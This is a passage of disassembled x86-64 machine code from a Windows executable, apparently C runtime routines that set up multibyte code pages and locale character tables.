   140008e13:	74 5d                	je     0x140008e72
   140008e15:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140008e1b:	45 8b c8             	mov    %r8d,%r9d
   140008e1e:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140008e22:	0f 10 00             	movups (%rax),%xmm0
   140008e25:	0f 11 01             	movups %xmm0,(%rcx)
   140008e28:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140008e2c:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140008e30:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140008e34:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140008e38:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140008e3c:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140008e40:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140008e44:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140008e48:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140008e4c:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140008e50:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140008e54:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140008e58:	48 03 ca             	add    %rdx,%rcx
   140008e5b:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140008e5f:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140008e63:	48 03 c2             	add    %rdx,%rax
   140008e66:	49 83 e9 01          	sub    $0x1,%r9
   140008e6a:	75 b6                	jne    0x140008e22
   140008e6c:	8a 00                	mov    (%rax),%al
   140008e6e:	88 01                	mov    %al,(%rcx)
   140008e70:	eb 27                	jmp    0x140008e99
   140008e72:	33 d2                	xor    %edx,%edx
   140008e74:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140008e7a:	e8 81 62 00 00       	call   0x14000f100
   140008e7f:	e8 e8 f0 ff ff       	call   0x140007f6c
   140008e84:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008e8a:	e8 35 ef ff ff       	call   0x140007dc4
   140008e8f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140008e95:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140008e99:	48 8b 03             	mov    (%rbx),%rax
   140008e9c:	48 8b 08             	mov    (%rax),%rcx
   140008e9f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140008ea6:	48 05 19 01 00 00    	add    $0x119,%rax
   140008eac:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008eb1:	48 8b 0d 08 60 01 00 	mov    0x16008(%rip),%rcx        # 0x14001eec0
   140008eb8:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140008ebd:	48 85 c9             	test   %rcx,%rcx
   140008ec0:	74 5e                	je     0x140008f20
   140008ec2:	48 85 c0             	test   %rax,%rax
   140008ec5:	74 4c                	je     0x140008f13
   140008ec7:	0f 10 00             	movups (%rax),%xmm0
   140008eca:	0f 11 01             	movups %xmm0,(%rcx)
   140008ecd:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140008ed1:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140008ed5:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140008ed9:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140008edd:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140008ee1:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140008ee5:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140008ee9:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140008eed:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140008ef1:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140008ef5:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140008ef9:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140008efd:	48 03 ca             	add    %rdx,%rcx
   140008f00:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140008f04:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140008f08:	48 03 c2             	add    %rdx,%rax
   140008f0b:	49 83 e8 01          	sub    $0x1,%r8
   140008f0f:	75 b6                	jne    0x140008ec7
   140008f11:	eb 1d                	jmp    0x140008f30
   140008f13:	33 d2                	xor    %edx,%edx
   140008f15:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140008f1b:	e8 e0 61 00 00       	call   0x14000f100
   140008f20:	e8 47 f0 ff ff       	call   0x140007f6c
   140008f25:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008f2b:	e8 94 ee ff ff       	call   0x140007dc4
   140008f30:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008f34:	48 8b 08             	mov    (%rax),%rcx
   140008f37:	48 8b 11             	mov    (%rcx),%rdx
   140008f3a:	83 c8 ff             	or     $0xffffffff,%eax
   140008f3d:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   140008f41:	83 f8 01             	cmp    $0x1,%eax
   140008f44:	75 1b                	jne    0x140008f61
   140008f46:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008f4a:	48 8b 08             	mov    (%rax),%rcx
   140008f4d:	48 8d 05 5c 51 01 00 	lea    0x1515c(%rip),%rax        # 0x14001e0b0
   140008f54:	48 39 01             	cmp    %rax,(%rcx)
   140008f57:	74 08                	je     0x140008f61
   140008f59:	48 8b 09             	mov    (%rcx),%rcx
   140008f5c:	e8 af f0 ff ff       	call   0x140008010
   140008f61:	48 8b 03             	mov    (%rbx),%rax
   140008f64:	48 8b 10             	mov    (%rax),%rdx
   140008f67:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008f6b:	48 8b 08             	mov    (%rax),%rcx
   140008f6e:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140008f75:	48 89 01             	mov    %rax,(%rcx)
   140008f78:	48 8b 03             	mov    (%rbx),%rax
   140008f7b:	48 8b 08             	mov    (%rax),%rcx
   140008f7e:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140008f85:	f0 ff 00             	lock incl (%rax)
   140008f88:	8b 0f                	mov    (%rdi),%ecx
   140008f8a:	e8 55 0d 00 00       	call   0x140009ce4
   140008f8f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008f94:	48 83 c4 40          	add    $0x40,%rsp
   140008f98:	5f                   	pop    %rdi
   140008f99:	c3                   	ret
   140008f9a:	cc                   	int3
   140008f9b:	cc                   	int3
   140008f9c:	40 53                	rex push %rbx
   140008f9e:	48 83 ec 40          	sub    $0x40,%rsp
   140008fa2:	8b d9                	mov    %ecx,%ebx
   140008fa4:	33 d2                	xor    %edx,%edx
   140008fa6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008fab:	e8 38 fb ff ff       	call   0x140008ae8
   140008fb0:	83 25 19 5f 01 00 00 	andl   $0x0,0x15f19(%rip)        # 0x14001eed0
   140008fb7:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140008fba:	75 12                	jne    0x140008fce
   140008fbc:	c7 05 0a 5f 01 00 01 	movl   $0x1,0x15f0a(%rip)        # 0x14001eed0
   140008fc3:	00 00 00 
   140008fc6:	ff 15 dc 71 00 00    	call   *0x71dc(%rip)        # 0x1400101a8
   140008fcc:	eb 15                	jmp    0x140008fe3
   140008fce:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140008fd1:	75 14                	jne    0x140008fe7
   140008fd3:	c7 05 f3 5e 01 00 01 	movl   $0x1,0x15ef3(%rip)        # 0x14001eed0
   140008fda:	00 00 00 
   140008fdd:	ff 15 bd 71 00 00    	call   *0x71bd(%rip)        # 0x1400101a0
   140008fe3:	8b d8                	mov    %eax,%ebx
   140008fe5:	eb 17                	jmp    0x140008ffe
   140008fe7:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140008fea:	75 12                	jne    0x140008ffe
   140008fec:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140008ff1:	c7 05 d5 5e 01 00 01 	movl   $0x1,0x15ed5(%rip)        # 0x14001eed0
   140008ff8:	00 00 00 
   140008ffb:	8b 58 0c             	mov    0xc(%rax),%ebx
   140008ffe:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140009003:	74 0c                	je     0x140009011
   140009005:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000900a:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140009011:	8b c3                	mov    %ebx,%eax
   140009013:	48 83 c4 40          	add    $0x40,%rsp
   140009017:	5b                   	pop    %rbx
   140009018:	c3                   	ret
   140009019:	cc                   	int3
   14000901a:	cc                   	int3
   14000901b:	cc                   	int3
   14000901c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009021:	57                   	push   %rdi
   140009022:	48 83 ec 20          	sub    $0x20,%rsp
   140009026:	48 8b d9             	mov    %rcx,%rbx
   140009029:	33 d2                	xor    %edx,%edx
   14000902b:	48 83 c1 18          	add    $0x18,%rcx
   14000902f:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140009035:	e8 c6 60 00 00       	call   0x14000f100
   14000903a:	33 d2                	xor    %edx,%edx
   14000903c:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   140009040:	0f b7 c2             	movzwl %dx,%eax
   140009043:	4c 8d 0d 66 50 01 00 	lea    0x15066(%rip),%r9        # 0x14001e0b0
   14000904a:	48 89 53 04          	mov    %rdx,0x4(%rbx)
   14000904e:	4c 8b c3             	mov    %rbx,%r8
   140009051:	48 89 93 20 02 00 00 	mov    %rdx,0x220(%rbx)
   140009058:	8d 4a 06             	lea    0x6(%rdx),%ecx
   14000905b:	66 f3 ab             	rep stos %ax,(%rdi)
   14000905e:	48 8d 05 63 50 01 00 	lea    0x15063(%rip),%rax        # 0x14001e0c8
   140009065:	8b fa                	mov    %edx,%edi
   140009067:	4c 2b c0             	sub    %rax,%r8
   14000906a:	4a 8d 0c 0f          	lea    (%rdi,%r9,1),%rcx
   14000906e:	48 ff c7             	inc    %rdi
   140009071:	8a 41 18             	mov    0x18(%rcx),%al
   140009074:	41 88 44 08 30       	mov    %al,0x30(%r8,%rcx,1)
   140009079:	48 81 ff 01 01 00 00 	cmp    $0x101,%rdi
   140009080:	7c e8                	jl     0x14000906a
   140009082:	48 8d 05 40 51 01 00 	lea    0x15140(%rip),%rax        # 0x14001e1c9
   140009089:	48 2b d8             	sub    %rax,%rbx
   14000908c:	4a 8d 0c 0a          	lea    (%rdx,%r9,1),%rcx
   140009090:	48 ff c2             	inc    %rdx
   140009093:	8a 81 19 01 00 00    	mov    0x119(%rcx),%al
   140009099:	88 84 0b 32 02 00 00 	mov    %al,0x232(%rbx,%rcx,1)
   1400090a0:	48 81 fa 00 01 00 00 	cmp    $0x100,%rdx
   1400090a7:	7c e3                	jl     0x14000908c
   1400090a9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400090ae:	48 83 c4 20          	add    $0x20,%rsp
   1400090b2:	5f                   	pop    %rdi
   1400090b3:	c3                   	ret
   1400090b4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400090b9:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400090be:	55                   	push   %rbp
   1400090bf:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   1400090c6:	ff 
   1400090c7:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   1400090ce:	48 8b 05 2b 4f 01 00 	mov    0x14f2b(%rip),%rax        # 0x14001e000
   1400090d5:	48 33 c4             	xor    %rsp,%rax
   1400090d8:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   1400090df:	33 c0                	xor    %eax,%eax
   1400090e1:	48 8b f9             	mov    %rcx,%rdi
   1400090e4:	8b 49 04             	mov    0x4(%rcx),%ecx
   1400090e7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400090ea:	89 44 24 60          	mov    %eax,0x60(%rsp)
   1400090ee:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400090f3:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   1400090f9:	0f 84 47 01 00 00    	je     0x140009246
   1400090ff:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140009104:	ff 15 a6 70 00 00    	call   *0x70a6(%rip)        # 0x1400101b0
   14000910a:	85 c0                	test   %eax,%eax
   14000910c:	0f 84 34 01 00 00    	je     0x140009246
   140009112:	33 c0                	xor    %eax,%eax
   140009114:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140009119:	bb 00 01 00 00       	mov    $0x100,%ebx
   14000911e:	88 01                	mov    %al,(%rcx)
   140009120:	ff c0                	inc    %eax
   140009122:	48 ff c1             	inc    %rcx
   140009125:	3b c3                	cmp    %ebx,%eax
   140009127:	72 f5                	jb     0x14000911e
   140009129:	8a 44 24 56          	mov    0x56(%rsp),%al
   14000912d:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   140009132:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140009137:	eb 20                	jmp    0x140009159
   140009139:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   14000913e:	0f b6 c8             	movzbl %al,%ecx
   140009141:	eb 0b                	jmp    0x14000914e
   140009143:	3b cb                	cmp    %ebx,%ecx
   140009145:	73 0c                	jae    0x140009153
   140009147:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   14000914c:	ff c1                	inc    %ecx
   14000914e:	41 3b c8             	cmp    %r8d,%ecx
   140009151:	76 f0                	jbe    0x140009143
   140009153:	48 83 c2 02          	add    $0x2,%rdx
   140009157:	8a 02                	mov    (%rdx),%al
   140009159:	84 c0                	test   %al,%al
   14000915b:	75 dc                	jne    0x140009139
   14000915d:	8b 47 04             	mov    0x4(%rdi),%eax
   140009160:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140009165:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000916a:	44 8b cb             	mov    %ebx,%r9d
   14000916d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009171:	ba 01 00 00 00       	mov    $0x1,%edx
   140009176:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   14000917d:	33 c9                	xor    %ecx,%ecx
   14000917f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009184:	e8 eb 14 00 00       	call   0x14000a674
   140009189:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   14000918e:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140009193:	8b 47 04             	mov    0x4(%rdi),%eax
   140009196:	44 8b c3             	mov    %ebx,%r8d
   140009199:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   1400091a0:	33 c9                	xor    %ecx,%ecx
   1400091a2:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400091a6:	48 8d 45 70          	lea    0x70(%rbp),%rax
   1400091aa:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400091ae:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400091b3:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400091b7:	e8 0c 3d 00 00       	call   0x14000cec8
   1400091bc:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   1400091c1:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   1400091c6:	8b 47 04             	mov    0x4(%rdi),%eax
   1400091c9:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   1400091cf:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   1400091d6:	33 c9                	xor    %ecx,%ecx
   1400091d8:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400091dc:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   1400091e3:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400091e7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400091ec:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400091f0:	e8 d3 3c 00 00       	call   0x14000cec8
   1400091f5:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400091f9:	4c 2b c7             	sub    %rdi,%r8
   1400091fc:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   140009203:	4c 2b cf             	sub    %rdi,%r9
   140009206:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   14000920d:	48 8d 47 19          	lea    0x19(%rdi),%rax
   140009211:	f6 02 01             	testb  $0x1,(%rdx)
   140009214:	74 0a                	je     0x140009220
   140009216:	80 08 10             	orb    $0x10,(%rax)
   140009219:	41 8a 4c 00 e7       	mov    -0x19(%r8,%rax,1),%cl
   14000921e:	eb 11                	jmp    0x140009231
   140009220:	f6 02 02             	testb  $0x2,(%rdx)
   140009223:	74 0a                	je     0x14000922f
   140009225:	80 08 20             	orb    $0x20,(%rax)
   140009228:	42 8a 4c 08 e7       	mov    -0x19(%rax,%r9,1),%cl
   14000922d:	eb 02                	jmp    0x140009231
   14000922f:	32 c9                	xor    %cl,%cl
   140009231:	88 88 00 01 00 00    	mov    %cl,0x100(%rax)
   140009237:	48 83 c2 02          	add    $0x2,%rdx
   14000923b:	48 ff c0             	inc    %rax
   14000923e:	48 83 eb 01          	sub    $0x1,%rbx
   140009242:	75 cd                	jne    0x140009211
   140009244:	eb 3f                	jmp    0x140009285
   140009246:	33 d2                	xor    %edx,%edx
   140009248:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   14000924c:	bb 00 01 00 00       	mov    $0x100,%ebx
   140009251:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   140009255:	41 8d 40 20          	lea    0x20(%r8),%eax
   140009259:	83 f8 19             	cmp    $0x19,%eax
   14000925c:	77 08                	ja     0x140009266
   14000925e:	80 09 10             	orb    $0x10,(%rcx)
   140009261:	8d 42 20             	lea    0x20(%rdx),%eax
   140009264:	eb 10                	jmp    0x140009276
   140009266:	41 83 f8 19          	cmp    $0x19,%r8d
   14000926a:	77 08                	ja     0x140009274
   14000926c:	80 09 20             	orb    $0x20,(%rcx)
   14000926f:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140009272:	eb 02                	jmp    0x140009276
   140009274:	32 c0                	xor    %al,%al
   140009276:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   14000927c:	ff c2                	inc    %edx
   14000927e:	48 ff c1             	inc    %rcx
   140009281:	3b d3                	cmp    %ebx,%edx
   140009283:	72 cc                	jb     0x140009251
   140009285:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   14000928c:	48 33 cc             	xor    %rsp,%rcx
   14000928f:	e8 7c 9e ff ff       	call   0x140003110
   140009294:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   14000929b:	00 
   14000929c:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400092a0:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   1400092a4:	49 8b e3             	mov    %r11,%rsp
   1400092a7:	5d                   	pop    %rbp
   1400092a8:	c3                   	ret
   1400092a9:	cc                   	int3
   1400092aa:	cc                   	int3
   1400092ab:	cc                   	int3
   1400092ac:	48 8b c4             	mov    %rsp,%rax
   1400092af:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400092b3:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400092b7:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1400092bb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400092bf:	55                   	push   %rbp
   1400092c0:	57                   	push   %rdi
   1400092c1:	41 56                	push   %r14
   1400092c3:	48 8d a8 78 fe ff ff 	lea    -0x188(%rax),%rbp
   1400092ca:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   1400092d1:	44 8a f2             	mov    %dl,%r14b
   1400092d4:	8b d9                	mov    %ecx,%ebx
   1400092d6:	49 8b d1             	mov    %r9,%rdx
   1400092d9:	49 8b c8             	mov    %r8,%rcx
   1400092dc:	e8 3b 02 00 00       	call   0x14000951c
   1400092e1:	8b cb                	mov    %ebx,%ecx
   1400092e3:	e8 b4 fc ff ff       	call   0x140008f9c
   1400092e8:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   1400092ef:	8b f8                	mov    %eax,%edi
   1400092f1:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   1400092f8:	41 3b 40 04          	cmp    0x4(%r8),%eax
   1400092fc:	75 07                	jne    0x140009305
   1400092fe:	33 c0                	xor    %eax,%eax
   140009300:	e9 fe 01 00 00       	jmp    0x140009503
   140009305:	b9 28 02 00 00       	mov    $0x228,%ecx
   14000930a:	e8 d1 12 00 00       	call   0x14000a5e0
   14000930f:	48 8b d8             	mov    %rax,%rbx
   140009312:	48 85 c0             	test   %rax,%rax
   140009315:	75 0f                	jne    0x140009326
   140009317:	33 c9                	xor    %ecx,%ecx
   140009319:	e8 f2 ec ff ff       	call   0x140008010
   14000931e:	83 c8 ff             	or     $0xffffffff,%eax
   140009321:	e9 dd 01 00 00       	jmp    0x140009503
   140009326:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000932d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140009332:	ba 04 00 00 00       	mov    $0x4,%edx
   140009337:	44 8b c2             	mov    %edx,%r8d
   14000933a:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   140009341:	44 8d 4a 7c          	lea    0x7c(%rdx),%r9d
   140009345:	0f 10 00             	movups (%rax),%xmm0
   140009348:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000934c:	0f 11 01             	movups %xmm0,(%rcx)
   14000934f:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140009353:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140009357:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   14000935b:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   14000935f:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140009363:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140009367:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   14000936b:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   14000936f:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140009373:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140009377:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   14000937b:	49 03 c1             	add    %r9,%rax
   14000937e:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140009382:	49 03 c9             	add    %r9,%rcx
   140009385:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140009389:	49 83 e8 01          	sub    $0x1,%r8
   14000938d:	75 b6                	jne    0x140009345
   14000938f:	0f 10 00             	movups (%rax),%xmm0
   140009392:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140009396:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000939a:	0f 11 01             	movups %xmm0,(%rcx)
   14000939d:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400093a1:	48 89 41 20          	mov    %rax,0x20(%rcx)
   1400093a5:	48 8b cb             	mov    %rbx,%rcx
   1400093a8:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400093ad:	0f 10 00             	movups (%rax),%xmm0
   1400093b0:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400093b4:	0f 11 01             	movups %xmm0,(%rcx)
   1400093b7:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1400093bb:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400093bf:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   1400093c3:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1400093c7:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1400093cb:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   1400093cf:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400093d3:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   1400093d7:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1400093db:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400093df:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400093e3:	49 03 c1             	add    %r9,%rax
   1400093e6:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1400093ea:	49 03 c9             	add    %r9,%rcx
   1400093ed:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1400093f1:	48 83 ea 01          	sub    $0x1,%rdx
   1400093f5:	75 b6                	jne    0x1400093ad
   1400093f7:	0f 10 00             	movups (%rax),%xmm0
   1400093fa:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400093fe:	48 8b 40 20          	mov    0x20(%rax),%rax
   140009402:	0f 11 01             	movups %xmm0,(%rcx)
   140009405:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140009409:	48 89 41 20          	mov    %rax,0x20(%rcx)
   14000940d:	8b cf                	mov    %edi,%ecx
   14000940f:	21 13                	and    %edx,(%rbx)
   140009411:	48 8b d3             	mov    %rbx,%rdx
   140009414:	e8 37 02 00 00       	call   0x140009650
   140009419:	83 cf ff             	or     $0xffffffff,%edi
   14000941c:	8b f0                	mov    %eax,%esi
   14000941e:	3b c7                	cmp    %edi,%eax
   140009420:	75 1a                	jne    0x14000943c
   140009422:	e8 45 eb ff ff       	call   0x140007f6c
   140009427:	48 8b cb             	mov    %rbx,%rcx
   14000942a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009430:	e8 db eb ff ff       	call   0x140008010
   140009435:	8b c7                	mov    %edi,%eax
   140009437:	e9 c7 00 00 00       	jmp    0x140009503
   14000943c:	45 84 f6             	test   %r14b,%r14b
   14000943f:	75 05                	jne    0x140009446
   140009441:	e8 82 d7 ff ff       	call   0x140006bc8
   140009446:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000944d:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140009454:	8b c7                	mov    %edi,%eax
   140009456:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000945a:	03 c7                	add    %edi,%eax
   14000945c:	75 1f                	jne    0x14000947d
   14000945e:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140009465:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   14000946c:	48 8d 05 3d 4c 01 00 	lea    0x14c3d(%rip),%rax        # 0x14001e0b0
   140009473:	48 3b c8             	cmp    %rax,%rcx
   140009476:	74 05                	je     0x14000947d
   140009478:	e8 93 eb ff ff       	call   0x140008010
   14000947d:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140009483:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   14000948a:	48 89 98 88 00 00 00 	mov    %rbx,0x88(%rax)
   140009491:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   140009498:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   14000949e:	85 0d 5c 53 01 00    	test   %ecx,0x1535c(%rip)        # 0x14001e800
   1400094a4:	75 54                	jne    0x1400094fa
   1400094a6:	48 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%rax
   1400094ad:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400094b2:	4c 8d 4c 24 24       	lea    0x24(%rsp),%r9
   1400094b7:	48 8d 85 a8 01 00 00 	lea    0x1a8(%rbp),%rax
   1400094be:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400094c3:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400094c8:	b8 05 00 00 00       	mov    $0x5,%eax
   1400094cd:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400094d2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400094d7:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1400094db:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400094df:	e8 e8 f8 ff ff       	call   0x140008dcc
   1400094e4:	45 84 f6             	test   %r14b,%r14b
   1400094e7:	74 11                	je     0x1400094fa
   1400094e9:	48 8b 85 a8 01 00 00 	mov    0x1a8(%rbp),%rax
   1400094f0:	48 8b 08             	mov    (%rax),%rcx
   1400094f3:	48 89 0d 56 52 01 00 	mov    %rcx,0x15256(%rip)        # 0x14001e750
   1400094fa:	33 c9                	xor    %ecx,%ecx
   1400094fc:	e8 0f eb ff ff       	call   0x140008010
   140009501:	8b c6                	mov    %esi,%eax
   140009503:	4c 8d 9c 24 70 02 00 	lea    0x270(%rsp),%r11
   14000950a:	00 
   14000950b:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000950f:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140009513:	49 8b e3             	mov    %r11,%rsp
   140009516:	41 5e                	pop    %r14
   140009518:	5f                   	pop    %rdi
   140009519:	5d                   	pop    %rbp
   14000951a:	c3                   	ret
   14000951b:	cc                   	int3
   14000951c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140009521:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009526:	57                   	push   %rdi
   140009527:	48 83 ec 20          	sub    $0x20,%rsp
   14000952b:	48 8b f2             	mov    %rdx,%rsi
   14000952e:	48 8b f9             	mov    %rcx,%rdi
   140009531:	8b 05 c9 52 01 00    	mov    0x152c9(%rip),%eax        # 0x14001e800
   140009537:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   14000953d:	74 13                	je     0x140009552
   14000953f:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   140009546:	00 
   140009547:	74 09                	je     0x140009552
